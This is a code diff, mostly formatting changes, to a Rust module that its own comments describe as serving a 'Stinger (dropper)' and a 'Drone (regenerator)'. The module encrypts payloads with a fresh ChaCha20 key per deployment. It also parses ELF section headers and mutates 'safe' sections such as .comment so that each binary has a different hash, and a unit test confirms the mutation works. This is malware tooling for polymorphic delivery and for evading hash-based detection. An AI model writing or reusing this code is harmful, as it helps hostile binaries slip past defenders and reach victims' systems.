@@ -2,8 +2,8 @@
 // Each deployment gets a unique ChaCha20 key → different binary hashes.
 // Used by the Stinger (dropper) and Drone (regenerator).
 
-use chacha20::ChaCha20;
 use chacha20::cipher::{KeyIvInit, StreamCipher};
+use chacha20::ChaCha20;
 use rand::Rng;
 
 /// Generate a random 32-byte ChaCha20 key and 12-byte nonce.
@@ -31,7 +31,9 @@ pub fn seal_payload(data: &[u8]) -> Vec<u8> {
 
 /// Decrypt a sealed payload. Input: (nonce || ciphertext). Uses provided key.
 pub fn unseal_payload(sealed: &[u8], key: &[u8; 32]) -> Option<Vec<u8>> {
-    if sealed.len() < 12 { return None; }
+    if sealed.len() < 12 {
+        return None;
+    }
     let nonce: [u8; 12] = sealed[..12].try_into().unwrap();
     let mut ciphertext = sealed[12..].to_vec();
 
@@ -90,10 +92,14 @@ fn safe_mutation_ranges(data: &[u8]) -> Vec<(usize, usize)> {
         }
         // Read section name offset from .shstrtab
         let sh_offset = u64::from_le_bytes(
-            data[entry_off + 0x18..entry_off + 0x20].try_into().unwrap_or([0u8; 8]),
+            data[entry_off + 0x18..entry_off + 0x20]
+                .try_into()
+                .unwrap_or([0u8; 8]),
         ) as usize;
         let sh_size = u64::from_le_bytes(
-            data[entry_off + 0x20..entry_off + 0x28].try_into().unwrap_or([0u8; 8]),
+            data[entry_off + 0x20..entry_off + 0x28]
+                .try_into()
+                .unwrap_or([0u8; 8]),
         ) as usize;
 
         if sh_size == 0 || sh_offset == 0 {
@@ -107,15 +113,21 @@ fn safe_mutation_ranges(data: &[u8]) -> Vec<(usize, usize)> {
         // For simplicity, match by common safe section patterns
         // by checking the section header string table index
         let sh_name = u32::from_le_bytes(
-            data[entry_off..entry_off + 4].try_into().unwrap_or([0u8; 4]),
+            data[entry_off..entry_off + 4]
+                .try_into()
+                .unwrap_or([0u8; 4]),
         ) as usize;
 
         // Get the string table section (index 0) to resolve names
         let strtab_off = u64::from_le_bytes(
-            data[shoff + 0x18..shoff + 0x20].try_into().unwrap_or([0u8; 8]),
+            data[shoff + 0x18..shoff + 0x20]
+                .try_into()
+                .unwrap_or([0u8; 8]),
         ) as usize;
         let strtab_size = u64::from_le_bytes(
-            data[shoff + 0x20..shoff + 0x28].try_into().unwrap_or([0u8; 8]),
+            data[shoff + 0x20..shoff + 0x28]
+                .try_into()
+                .unwrap_or([0u8; 8]),
         ) as usize;
 
         if strtab_off == 0 || strtab_size == 0 {
@@ -130,8 +142,9 @@ fn safe_mutation_ranges(data: &[u8]) -> Vec<(usize, usize)> {
             .iter()
             .position(|&b| b == 0)
             .unwrap_or(0);
-        let name = std::str::from_utf8(&data[strtab_off + sh_name..strtab_off + sh_name + name_end])
-            .unwrap_or("");
+        let name =
+            std::str::from_utf8(&data[strtab_off + sh_name..strtab_off + sh_name + name_end])
+                .unwrap_or("");
 
         if SAFE_SECTIONS.iter().any(|prefix| name.starts_with(prefix)) {
             ranges.push((sh_offset, sh_offset + sh_size));
@@ -241,7 +254,8 @@ mod tests {
         // Write .shstrtab data
         elf[strtab_off as usize..(strtab_off + strtab_sz) as usize].copy_from_slice(strtab_data);
         // Write .comment data
-        elf[comment_off as usize..(comment_off + comment_sz) as usize].copy_from_slice(comment_data);
+        elf[comment_off as usize..(comment_off + comment_sz) as usize]
+            .copy_from_slice(comment_data);
 
         // Section header 0: .shstrtab
         let s0 = shoff as usize;
@@ -258,15 +272,21 @@ mod tests {
         elf[s2 + 0x20..s2 + 0x28].copy_from_slice(&comment_sz.to_le_bytes());
 
         let mutated = mutate_binary(&elf);
-        assert_eq!(mutated.len(), elf.len(),
-            "ELF mutation must preserve length");
+        assert_eq!(
+            mutated.len(),
+            elf.len(),
+            "ELF mutation must preserve length"
+        );
         // ELF magic intact
         assert_eq!(&mutated[..4], &elf[..4], "ELF magic preserved");
         // .comment section changed
         let c_start = comment_off as usize;
         let c_end = c_start + comment_sz as usize;
-        assert_ne!(&mutated[c_start..c_end], &elf[c_start..c_end],
-            ".comment section must be mutated");
+        assert_ne!(
+            &mutated[c_start..c_end],
+            &elf[c_start..c_end],
+            ".comment section must be mutated"
+        );
     }
 
     #[test]
